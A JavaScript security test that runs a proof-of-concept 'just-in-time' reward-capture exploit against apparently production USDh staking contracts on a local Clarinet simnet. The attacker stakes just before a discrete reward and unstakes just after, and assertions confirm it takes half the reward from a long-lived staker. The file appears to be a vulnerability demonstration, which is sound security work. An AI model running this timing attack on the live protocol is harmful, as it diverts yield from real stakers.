import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const ONE_USDH = 100_000_000n;
const LEGACY_PRINCIPAL = ONE_USDH;
const JIT_PRINCIPAL = ONE_USDH;
// 10 raw bps of the 1 USDh legacy stake, and only 5 bps once the JIT stake enters.
// It is also below controller-v1-1's default 10-bps cap computed on the 2 USDh total supply.
const REWARD = 100_000n; // 0.001 USDh
const EXPECTED_CAPTURE = 50_000n; // exactly half the discrete reward

async function runCase(mode) {
  const simnet = await initSimnet('tests/security/usdh/Clarinet.toml');
  const accounts = simnet.getAccounts();
  const deployer = accounts.get('deployer');
  const legacy = accounts.get('wallet_1');
  const jit = accounts.get('wallet_2');
  if (!deployer || !legacy || !jit) throw new Error('missing simnet accounts');

  const c = n => `${deployer}.${n}`;
  const text = r => cvToString(r.result);
  const pub = (n, fn, args, sender) => simnet.callPublicFn(c(n), fn, args, sender);
  const ro = (n, fn, args = [], sender = deployer) => simnet.callReadOnlyFn(c(n), fn, args, sender);
  const expect = (label, r, wanted) => {
    const got = text(r);
    console.log(`[${mode}] ${label}: ${got}`);
    assert.equal(got, wanted, `${label}: expected ${wanted}, got ${got}`);
  };
  const uint = r => {
    const m = text(r).match(/(?:\(ok )?u(\d+)\)?/);
    if (!m) throw new Error(`not uint: ${text(r)}`);
    return BigInt(m[1]);
  };
  const usdh = who => uint(ro('usdh-token', 'get-balance', [Cl.principal(who)], who));
  const susdh = who => uint(ro('susdh-token', 'get-balance', [Cl.principal(who)], who));
  const reserve = () => usdh(c('staking-reserve'));
  const ratio = () => uint(ro('staking', 'get-usdh-per-susdh'));

  const helper = c('jit-seed-helper');
  const silo = c('staking-silo');

  // Production HQ initializes .staking and .controller as minting contracts.
  expect('staking is production minting contract', ro('hq', 'get-minting-contract', [Cl.principal(c('staking'))]), '(tuple (active true) (burn-block-height (some u0)))');

  // The production staking-reserve requires the staking-silo recipient to be an active
  // protocol contract. Mainnet config does this operationally; mirror only that registry bit.
  expect('activate staking-silo protocol recipient', pub('hq', 'set-contract-active', [Cl.principal(silo), Cl.bool(true)], deployer), '(ok true)');

  // Register a test-only mint helper so we can seed user balances. This helper is owner-only
  // and is NOT part of the exploit. It also reproduces the exact physical reward transition
  // performed by production controller-v1-1: USDh mint-for-protocol(..., staking-reserve).
  expect('request seed helper minting role', pub('hq', 'request-minting-contract-update', [Cl.principal(helper)], deployer), '(ok true)');
  simnet.mineEmptyBlocks(1200);
  expect('activate seed helper minting role', pub('hq', 'activate-minting-contract', [Cl.principal(helper)], deployer), '(ok true)');

  expect('seed legacy 1 USDh', pub('jit-seed-helper', 'mint-usdh', [Cl.uint(LEGACY_PRINCIPAL), Cl.principal(legacy)], deployer), '(ok true)');
  expect('seed JIT account 1 USDh', pub('jit-seed-helper', 'mint-usdh', [Cl.uint(JIT_PRINCIPAL), Cl.principal(jit)], deployer), '(ok true)');

  assert.equal(usdh(legacy), LEGACY_PRINCIPAL);
  assert.equal(usdh(jit), JIT_PRINCIPAL);
  assert.equal(reserve(), 0n);

  // Long-lived holder enters before the reward period.
  expect('legacy stake', pub('staking', 'stake', [Cl.uint(LEGACY_PRINCIPAL), Cl.none()], legacy), '(ok true)');
  assert.equal(susdh(legacy), LEGACY_PRINCIPAL);
  assert.equal(ratio(), ONE_USDH);

  if (mode === 'ATTACK') {
    // JIT staker enters immediately before the already-earned discrete reward is logged.
    expect('JIT stake immediately before reward', pub('staking', 'stake', [Cl.uint(JIT_PRINCIPAL), Cl.none()], jit), '(ok true)');
    assert.equal(susdh(jit), JIT_PRINCIPAL);
    assert.equal(ratio(), ONE_USDH);
  }

  const preRewardReserve = reserve();
  const preRewardSupply = uint(ro('susdh-token', 'get-total-supply'));
  console.log(`[${mode}] pre-reward reserve=${preRewardReserve} sUSDh-supply=${preRewardSupply}`);

  // Exact state transition made by production controller-v1-1::log-reward:
  //   usdh-token.mint-for-protocol(REWARD, staking-reserve)
  expect('discrete protocol reward minted to staking-reserve', pub('jit-seed-helper', 'mint-usdh', [Cl.uint(REWARD), Cl.principal(c('staking-reserve'))], deployer), '(ok true)');
  console.log(`[${mode}] post-reward ratio=${ratio()}`);

  let jitClaimId = null;
  if (mode === 'ATTACK') {
    // The attacker exits immediately after the reward. unstake() burns sUSDh and moves the
    // corresponding USDh into staking-silo immediately; the 7-day cooldown only delays wallet
    // delivery, so the captured amount is economically locked at this point.
    const r = pub('staking', 'unstake', [Cl.uint(JIT_PRINCIPAL)], jit);
    const got = text(r);
    console.log(`[${mode}] JIT unstake immediately after reward: ${got}`);
    const m = got.match(/^\(ok u(\d+)\)$/);
    assert.ok(m, `unexpected JIT claim result: ${got}`);
    jitClaimId = BigInt(m[1]);
  }

  // Legacy holder now exits too so both executions end with all user value in actual USDh.
  const legacyShares = susdh(legacy);
  const lr = pub('staking', 'unstake', [Cl.uint(legacyShares)], legacy);
  const ltxt = text(lr);
  console.log(`[${mode}] legacy unstake: ${ltxt}`);
  const lm = ltxt.match(/^\(ok u(\d+)\)$/);
  assert.ok(lm, `unexpected legacy claim result: ${ltxt}`);
  const legacyClaimId = BigInt(lm[1]);

  // Keep production 7-day cooldown unchanged; merely advance local time.
  simnet.mineEmptyBlocks(1500);

  if (jitClaimId !== null) expect('withdraw JIT claim', pub('staking-silo', 'withdraw', [Cl.uint(jitClaimId)], deployer), '(ok true)');
  expect('withdraw legacy claim', pub('staking-silo', 'withdraw', [Cl.uint(legacyClaimId)], deployer), '(ok true)');

  const legacyFinal = usdh(legacy);
  const jitFinal = usdh(jit);
  const totalFinal = legacyFinal + jitFinal;
  console.log(`[${mode}] legacy final USDh=${legacyFinal}`);
  console.log(`[${mode}] JIT final USDh=${jitFinal}`);
  console.log(`[${mode}] users total USDh=${totalFinal}`);

  return { legacyFinal, jitFinal, totalFinal };
}

console.log('=== USDh JIT REWARD A/B: production staking contracts ===');
const control = await runCase('CONTROL');
const attack = await runCase('ATTACK');

const jitGain = attack.jitFinal - control.jitFinal;
const legacyShortfall = control.legacyFinal - attack.legacyFinal;

console.log('\n=== TOKEN-LEVEL RESULT ===');
console.log(`reward:                    ${REWARD}`);
console.log(`control legacy payout:     ${control.legacyFinal}`);
console.log(`attack legacy payout:      ${attack.legacyFinal}`);
console.log(`legacy yield shortfall:    ${legacyShortfall}`);
console.log(`control JIT wallet:        ${control.jitFinal}`);
console.log(`attack JIT payout:         ${attack.jitFinal}`);
console.log(`JIT excess:                ${jitGain}`);
console.log(`control total user value:  ${control.totalFinal}`);
console.log(`attack total user value:   ${attack.totalFinal}`);

assert.equal(control.legacyFinal, LEGACY_PRINCIPAL + REWARD, 'without JIT entry legacy holder must receive the full reward');
assert.equal(control.jitFinal, JIT_PRINCIPAL, 'control JIT account stays liquid and earns no historical reward');
assert.equal(jitGain, EXPECTED_CAPTURE, 'JIT entrant must capture exactly half the reward');
assert.equal(legacyShortfall, EXPECTED_CAPTURE, 'legacy holder must lose exactly the same amount of yield');
assert.equal(control.totalFinal, attack.totalFinal, 'aggregate user value must be conserved');
assert.equal(control.totalFinal, LEGACY_PRINCIPAL + JIT_PRINCIPAL + REWARD);

console.log('PASS JIT REWARD CAPTURE: with identical initial user principal and the same discrete protocol reward, entering staking only immediately before the reward and unstaking immediately after transfers exactly half of that reward from the long-lived holder to the JIT entrant. Aggregate user value is identical, proving a zero-sum reallocation of staking yield rather than rounding or protocol-created value.');
console.log('NOTE: jit-seed-helper is setup-only. Production controller-v1-1 performs the same reward state transition by calling usdh-token::mint-for-protocol(reward-usdh, .staking-reserve); production history is validated separately by read-live-usdh-jit-reward-surface.mjs.');
